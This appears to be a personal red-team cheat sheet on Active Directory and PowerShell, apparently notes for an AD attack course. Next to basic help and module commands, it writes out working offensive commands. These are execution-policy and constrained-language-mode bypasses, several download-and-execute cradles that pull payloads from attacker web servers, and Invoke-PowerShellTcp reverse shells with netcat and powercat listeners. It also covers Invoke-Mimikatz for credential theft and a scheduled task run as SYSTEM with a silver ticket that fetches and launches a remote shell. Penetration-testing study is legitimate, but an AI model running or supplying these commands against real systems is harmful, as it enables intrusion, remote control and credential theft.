# AD - Basics & PowerShell Basics

## AD Basics

* Components of AD
  * Shema - Defines objects and their attributes
  * Query and index mechanisem
  * Global catalog - Information about every object
  * Replication service - Distributes information accross domain controllers
* A forest - which is a security boundary - may contain multiple domains and each domain may contain multiple Ous

### How to interact with Active Directory

* \[ADSI]
* .NET Classes (System.DirectoryServices.ActiveDirectoryy)
* Native Executables (like net….)
* PowerShell (.NET classes and WMI)

## Powershell Basics

With PowerShell Scripts you can use cmdlets, native commands, functions, .net, dlls, Windows API

### Help Command

```powershell
Get-Help * - Lists everything abtout the help topic
Get-Help process (lists everything which contains the word process)
Update-Help - Update the healp system (v3+)
Get-help cmdlet_name -Full - List full help about a topic
Get-Help cmdlet_name -Examples
Get-command -CommandType cmdlet - List all cmdlets
```

**Use this parameter to not print errors powershell**\
****-ErrorAction SilentlyContinue

**Rename powershell windows**\
****$host.ui.RawUI.WindowTitle = "name"&#x20;

### Execute

It is NOT a security boundary

<pre class="language-powershell"><code class="lang-powershell">Powershell -exectionpolicy bypass
<strong>powershell -ep bypass
</strong>Powershell -c &#x3C;cmd>
Powersehll -encodedcommand $env:PSExecutionPolicyPreference="bypass"
</code></pre>

### Language Mode & AppLocker

**Display current language mode**

```powershell
$executioncontext.sessionstate.languagemode
```

Constrained Language mode is the restriction of types which are not safe/disallowed in constrained language mode. E.g. .Net Classes,

Only Built-In Commandlets can be used and types/classes etc. are restricted\
Can be configured via AppLoker or Windows Defender Application Mode in Enforcement mode.

Constrained language mode is only for Powershellv5.1, v7 - if attacker can run Powershellv2 no language mode enforcement is possible.

**Set language mode - usually doesnt work**

```powershell
$ExecutionContext.SessionState.LanguageMode = 'fulllanguage'
[Environment]::SetEnvironmentVariable(‘__PSLockdownPolicy‘, ‘4’, ‘Machine‘)
```

**Check AppLocker Policy - maybe some excludes form constrained language**

```powershell
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections 

Default rule excludes C:\Windows\System32\
```

**Invoke-mimikatz when Constrained Language mode is in place**

So, we must modify Invoke-Mimikatz.ps1 to include the function call in the script itself and transfer the modified script (.\Invoke-MimikatzEx.ps1) to the target server.

**Check if you can run PowershellV2 which doesnt support CLM**

```
powershell -version 2
-or-
C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe
$ExecutionContext.SessionState.LanguageMode
```

### Execute .PS1 File / PowerView

{% code overflow="wrap" %}
```powershell
. .\PowerView.ps1
iex(iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 -UseBasicParsing)
```
{% endcode %}

### Execute AD Module

Download [https://github.com/samratashok/ADModule](https://github.com/samratashok/ADModule)

<pre class="language-powershell"><code class="lang-powershell"><strong>cd ADModule-master
</strong><strong>Import-Module .\Microsoft.ActiveDirectory.Management.dll -Verbose
</strong>Import-Module .\ActiveDirectory\ActiveDirectory.psd1
</code></pre>

{% hint style="info" %}
Most of the AD Modules have the -Filter -Properties and -Identity options!

Get-AD-User -Filter \* -Properties \*\
Get-AD-User -Identity username1 -Properties \*
{% endhint %}

{% code overflow="wrap" %}
```powershell
iex (new-Object Net.WebClient).DownloadString('
https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory

To be able to list all the cmdlets in the module, import the module as well. Remember to import the DLL first.
Import-Module C:\ADModule\Microsoft.ActiveDirectory.Management.dll -Verbose
Import-Module C:\AD\Tools\ADModule\ActiveDirectory\ActiveDirectory.psd1
Get-Command -Module ActiveDirectory
```
{% endcode %}

### Import Modules / Execute

**Import a module/file**

```powershell
Import-Module <modulepath>
```

**List all commands of a module**

```powershell
Get-Command -Module <modulename>
```

\
**Display Loaded functions**\
ls function:

### Download and execute PowerShell Scripts

<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell">powershell iex (iwr -UseBasicParsing http://ip/Invoke-PowerShellTcp.ps1); Power -Reverse -IPAddress ip -Port 443 
<strong>
</strong><strong>iex (New-Object Net.WebClient).DownloadString('https://webserver/pay.ps1') - Invoke Expression (iex alias)
</strong></code></pre>

Download and save PowerShell Script

{% code overflow="wrap" %}
```powershell
iwr http://172.16.x.x/Invoke-MimikatzEx.ps1 -OutFile C:\Windows\Tasks\Invoke-MimikatzEx.ps1
```
{% endcode %}

#### &#x20;**Use a COM Object**

{% code overflow="wrap" %}
```powershell
$ie=New-Object -ComObject InternetExplorer.Application;$ie.visible=$False;$ie.navigate('https://webserver/pay.ps1');sleep 5;$response=$ie.Document.body.innerHTML;$ie.quit();iex $response
```
{% endcode %}

#### **PSv3 or newer**

{% code overflow="wrap" %}
```powershell
i Iex (iwr '
http://websever/ps.ps1') -iwr is alias for invoke-web request
 $h=New-Object -ComObject
Msxml2.xmlhttp;$h.open('GET','http://webserver/ps.ps1',$fasle);$h.send();iex $h.responseText
$wr = [System.NET.WebRequest]::Create("http://werbser.ps.ps1")
$r = $wr.GetResponse()
IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()
```
{% endcode %}

**Invoke\_PowerShellTCP.ps1**

Add line at the end of the script:\
Invoke-PowershellTcp -Reverse -IPAddress attackersIP -Port port

## Start Netcat Listener (for e.g. Invoke\_powerShellTcp.ps1)

.\netcat-win32-1.12\nc64.exe -lvp 443

## Other

**Display/delete Kerberos Tickets**\
****klist\
klist purge

**List tasks**\
schtasks /S hostname.dom.local

**Schedudle an execute a task with silver ticket of "HOST" Service**&#x20;

{% code overflow="wrap" %}
```powershell
schtasks /create /S hostname.dom.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck" /TR "powershell.exe -c 'iex (new-object net.webclient).DownloadString(''http://ip/Invoke_powerShellTcp.ps1''')'" 
schtasks /Run /S hostname.dom.local /TN "STCheck"
```
{% endcode %}

**Start listener**\
****. .\powercat.ps1\
powercat -l -v -p 443 -t 1000\
&#x20; When connected press a few times enter

**HFS Webserver tool**\
****Drag & drop files in window to host it

**List tasks**\
tasklist /v

**Display Environment variable in Powershell**

```
Get-ChildItem -Path Env:
```





